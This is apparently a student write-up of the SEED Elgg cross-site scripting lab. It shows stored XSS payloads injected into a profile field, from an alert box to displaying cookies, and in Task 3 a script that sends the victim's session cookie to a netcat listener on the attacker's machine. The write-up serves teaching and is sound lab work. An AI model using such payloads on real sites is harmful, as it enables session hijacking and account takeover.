# Cross-Site Scripting (XSS)

## Setup

We configured the local DNS mapping in the /etc/hosts file to point the lab domains to the container IP, and then built and launched the Docker containers in detached mode.

```bash
$ sudo gedit /etc/hosts # added "10.9.0.5 www.seed-server.com" to the file
$ docker-compose build # build the container image
$ dcup -d #used -d to silently start the container in the background
```
### Target Application and Database Configuration
The target application for this lab is Elgg, an open-source social networking platform accessible at http://www.seed-server.com. The environment is configured to persist MySQL data on the host machine, ensuring that our changes to the database are preserved across container restarts.

## HTTP Request Analysis

To understand the structure of HTTP requests and construct our attacks, we utilized the built-in Firefox Web Developer Network Tool. This allowed us to inspect headers, cookies, and POST parameters (such as authentication tokens) necessary for crafting valid malicious requests, serving the same purpose as the suggested "HTTP Header Live" tool.

## Task 1 - Posting a Malicious Message to Display an Alert Window

### Objective
The objective of this task was to test the Elgg application for Stored Cross-Site Scripting (XSS) vulnerabilities by embedding a JavaScript snippet into a user profile. 

### Goal
The goal was to have the script execute automatically whenever the profile is viewed.

### Execution
We logged into the Elgg website using a standard user account (Alice) and navigated to the "Edit Profile" page.

We identified the "Brief Description" field as a potential injection point. We input the following JavaScript code to trigger a pop-up alert window:

```html
<script>alert('XSS');</script>
``` 

After saving the profile, we viewed it (both as the current user and as a different user) to verify the attack.

### Result

Upon loading the profile page, the browser executed the injected JavaScript, and the alert window was displayed immediately. This confirms that the application does not properly sanitize user input in the profile fields, allowing for Stored XSS.

--inserir imagem do ataque --


## Task 2 - Posting a Malicious Message to Display Cookies

### Objective 
Building upon the previous task, the objective was to modify the malicious JavaScript to access sensitive data stored in the user's browser. Specifically, we aimed to display the user's session cookies in the alert window when they viewed the compromised profile.

### Execution
We edited the "Brief Description" field of the user profile, replacing the previous script with the following one:

```html
<script>alert(document.cookie);</script>
```

### Result

As soon as the profile was saved or viewed by another user, the JavaScript executed. The alert window displayed the current session cookies, specifically the Elgg session ID.

---foto do ataque com as cookies--

### Security Implication
This demonstrates a critical security risk. If an attacker can read document.cookie, they can potentially steal the victim's session identifier (Session Hijacking). Instead of just displaying it in an alert, a real attacker would send this cookie to their own server, allowing them to take over the victim's account.We will demonstrate exactly how to do this in the following task.



## Task 3: Stealing Cookies from the Victim’s Machine

### Objective
The previous task demonstrated that cookies could be accessed via JavaScript, but they were only visible to the user viewing the page. The objective of this task was to extract these cookies to the attacker's machine. To achieve this, we needed the malicious script to send an HTTP request containing the cookies to a server controlled by the attacker.

### Setup: Attacker's Listener
First, on the attacker's machine (IP `10.9.0.1`), we set up a TCP listener using `netcat` to capture incoming requests. We used port `5555`.

```bash
$ nc -lknv 5555
```
--- falar aqui do comando $ nc -zvn 10.9.0.1 5555 que fez com que o trigger funcionasse--

-l: Listen for incoming connections.

-k: Keep listening after the current connection closes.

-n: Do not resolve hostnames (IP only).

-v: Verbose output.

### Execution

We injected the following code into the "Brief Description" field:
```html
<script>document.write(´<img src=http://10.9.0.1:5555?c=´
+ escape(document.cookie) + ´ >´);
</script>
```


#### How this works

1. The browser executes the script.

2. It tries to load the image from http://10.9.0.1:5555.

3. To do this, it sends an HTTP GET request to the attacker's machine.

4. The escape (document.cookie) function ensures the cookies are safely encoded and attached to the URL as the parameter c.

### Result
After saving the profile, we waited for a user (Alice) to view it. As soon as the page loaded, we observed an incoming connection on our netcat terminal.

The output contained the full HTTP GET request, including the stolen session cookie in the URL parameters.

We successfully captured the victim's session ID remotely.

---foto do ataque ---